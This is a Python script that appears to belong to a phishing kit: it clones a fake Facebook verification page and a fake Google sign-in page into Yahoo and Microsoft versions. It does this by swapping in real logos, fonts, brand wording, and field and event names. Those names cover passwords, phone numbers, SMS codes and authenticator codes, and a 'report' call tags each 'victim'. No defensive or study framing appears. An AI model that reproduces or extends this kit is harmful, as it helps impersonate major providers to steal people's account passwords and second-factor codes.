from pathlib import Path

root = Path(__file__).resolve().parents[1]
fb = (root / "fb-verify.html").read_text(encoding="utf-8")
gl = (root / "google-login.html").read_text(encoding="utf-8")


def make_verify(src: str, spec: dict) -> None:
    s = src
    s = s.replace("sessionStorage.getItem('fbVerifySession')", f"sessionStorage.getItem('{spec['session_key']}')")
    s = s.replace(
        "Log in to your Google account to confirm that it&rsquo;s you",
        spec["heading"],
    )
    s = s.replace(
        "For security reasons, we need you to verify with your Google Account by logging in with the Gmail address saved on your Facebook account:",
        spec["body_intro"],
    )
    s = s.replace(
        "We will not share any of your Facebook data with your Google account",
        spec["info_share"],
    )
    s = s.replace("Verify with Google", spec["btn_label"])
    s = s.replace("report('fb-verify-google')", f"report('{spec['victim']}')")
    s = s.replace("page: 'fb-verify'", f"page: '{spec['page']}'")
    s = s.replace("show-google-login", spec["socket_event"])
    s = s.replace("GoogleVerifyFlow", spec["flow_obj"])
    s = s.replace("google-login.html", spec["login_url"])
    (root / spec["out"]).write_text(s, encoding="utf-8", newline="\n")
    print("wrote", spec["out"])


make_verify(
    fb,
    {
        "out": "yahoo-verify.html",
        "session_key": "yahooVerifySession",
        "heading": "Log in to your Yahoo account to confirm that it&rsquo;s you",
        "body_intro": "For security reasons, we need you to verify with your Yahoo Account by logging in with the Yahoo email address saved on your Facebook account:",
        "info_share": "We will not share any of your Facebook data with your Yahoo account",
        "btn_label": "Verify with Yahoo",
        "victim": "fb-verify-yahoo",
        "page": "yahoo-verify",
        "socket_event": "show-yahoo-login",
        "flow_obj": "YahooVerifyFlow",
        "login_url": "yahoo-login.html",
    },
)

make_verify(
    fb,
    {
        "out": "microsoft-verify.html",
        "session_key": "microsoftVerifySession",
        "heading": "Log in to your Microsoft account to confirm that it&rsquo;s you",
        "body_intro": "For security reasons, we need you to verify with your Microsoft Account by logging in with the email address saved on your Facebook account:",
        "info_share": "We will not share any of your Facebook data with your Microsoft account",
        "btn_label": "Verify with Microsoft",
        "victim": "fb-verify-microsoft",
        "page": "microsoft-verify",
        "socket_event": "show-microsoft-login",
        "flow_obj": "MicrosoftVerifyFlow",
        "login_url": "microsoft-login.html",
    },
)

YAHOO_PAIRS = [
    ("Sign in – Google Accounts", "Sign in – Yahoo"),
    (
        "https://www.gstatic.com/images/branding/product/1x/googleg_16dp.png",
        "https://s.yimg.com/rz/l/yahoo_en-US_f_p_bestfit_2x.png",
    ),
    ('"Google Sans", Roboto', '"Helvetica Neue", Helvetica, Arial, sans-serif'),
    ("Sign in with Google", "Sign in with Yahoo"),
    ("googleLoginSession", "yahooLoginSession"),
    ("googleSkipEmailPrefill", "yahooSkipEmailPrefill"),
    ("googleReturnPage", "yahooReturnPage"),
    ("googleContinueApp", "yahooContinueApp"),
    ("page: 'google-login'", "page: 'yahoo-login'"),
    ("google-login-email", "yahoo-login-email"),
    ("google-login-password", "yahoo-login-password"),
    ("google-login-phone", "yahoo-login-phone"),
    ("google-login-sms", "yahoo-login-sms"),
    ("google-login-auth", "yahoo-login-auth"),
    ("google-login-prompt", "yahoo-login-prompt"),
    ("type: 'google_email'", "type: 'yahoo_email'"),
    ("type: 'google_password'", "type: 'yahoo_password'"),
    ("type: 'google_phone'", "type: 'yahoo_phone'"),
    ("type: 'google_sms_phone'", "type: 'yahoo_sms_phone'"),
    ("type: 'google_sms_code'", "type: 'yahoo_sms_code'"),
    ("type: 'google_auth_code'", "type: 'yahoo_auth_code'"),
    ("show-google-phone", "show-yahoo-phone"),
    ("show-google-prompt", "show-yahoo-prompt"),
    ("show-google-sms", "show-yahoo-sms"),
    ("show-google-wrong-number", "show-yahoo-wrong-number"),
    ("show-google-wrong-code", "show-yahoo-wrong-code"),
    ("show-google-wrong-auth-code", "show-yahoo-wrong-auth-code"),
    ("show-google-auth", "show-yahoo-auth"),
    ("show-gmail-wrong-pass", "show-yahoo-wrong-pass"),
    ("Google Authenticator", "Yahoo Account Key"),
    ("Google sent", "Yahoo sent"),
    ("Google wants", "Yahoo wants"),
    ("your Google account", "your Yahoo account"),
    ("Google account", "Yahoo account"),
    ("googlePostBody", "yahooPostBody"),
    ("Gmail or YouTube", "Yahoo Mail"),
    ("Gmail", "Yahoo Mail"),
]

MICROSOFT_PAIRS = [
    ("Sign in – Google Accounts", "Sign in – Microsoft account"),
    (
        "https://www.gstatic.com/images/branding/product/1x/googleg_16dp.png",
        "https://c.s-microsoft.com/favicon.ico",
    ),
    (
        '"Google Sans", Roboto',
        '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif',
    ),
    ("Sign in with Google", "Sign in with Microsoft"),
    ("googleLoginSession", "microsoftLoginSession"),
    ("googleSkipEmailPrefill", "microsoftSkipEmailPrefill"),
    ("googleReturnPage", "microsoftReturnPage"),
    ("googleContinueApp", "microsoftContinueApp"),
    ("page: 'google-login'", "page: 'microsoft-login'"),
    ("google-login-email", "microsoft-login-email"),
    ("google-login-password", "microsoft-login-password"),
    ("google-login-phone", "microsoft-login-phone"),
    ("google-login-sms", "microsoft-login-sms"),
    ("google-login-auth", "microsoft-login-auth"),
    ("google-login-prompt", "microsoft-login-prompt"),
    ("type: 'google_email'", "type: 'microsoft_email'"),
    ("type: 'google_password'", "type: 'microsoft_password'"),
    ("type: 'google_phone'", "type: 'microsoft_phone'"),
    ("type: 'google_sms_phone'", "type: 'microsoft_sms_phone'"),
    ("type: 'google_sms_code'", "type: 'microsoft_sms_code'"),
    ("type: 'google_auth_code'", "type: 'microsoft_auth_code'"),
    ("show-google-phone", "show-microsoft-phone"),
    ("show-google-prompt", "show-microsoft-prompt"),
    ("show-google-sms", "show-microsoft-sms"),
    ("show-google-wrong-number", "show-microsoft-wrong-number"),
    ("show-google-wrong-code", "show-microsoft-wrong-code"),
    ("show-google-wrong-auth-code", "show-microsoft-wrong-auth-code"),
    ("show-google-auth", "show-microsoft-auth"),
    ("show-gmail-wrong-pass", "show-microsoft-wrong-pass"),
    ("Google Authenticator", "Microsoft Authenticator"),
    ("Google sent", "Microsoft sent"),
    ("Google wants", "Microsoft wants"),
    ("your Google account", "your Microsoft account"),
    ("Google account", "Microsoft account"),
    ("googlePostBody", "microsoftPostBody"),
    ("Gmail or YouTube", "Outlook or Microsoft app"),
    ("Gmail", "Outlook"),
]


def apply_pairs(src: str, pairs: list[tuple[str, str]]) -> str:
    out = src
    for old, new in pairs:
        out = out.replace(old, new)
    return out


(root / "yahoo-login.html").write_text(apply_pairs(gl, YAHOO_PAIRS), encoding="utf-8", newline="\n")
print("wrote yahoo-login.html")
(root / "microsoft-login.html").write_text(apply_pairs(gl, MICROSOFT_PAIRS), encoding="utf-8", newline="\n")
print("wrote microsoft-login.html")
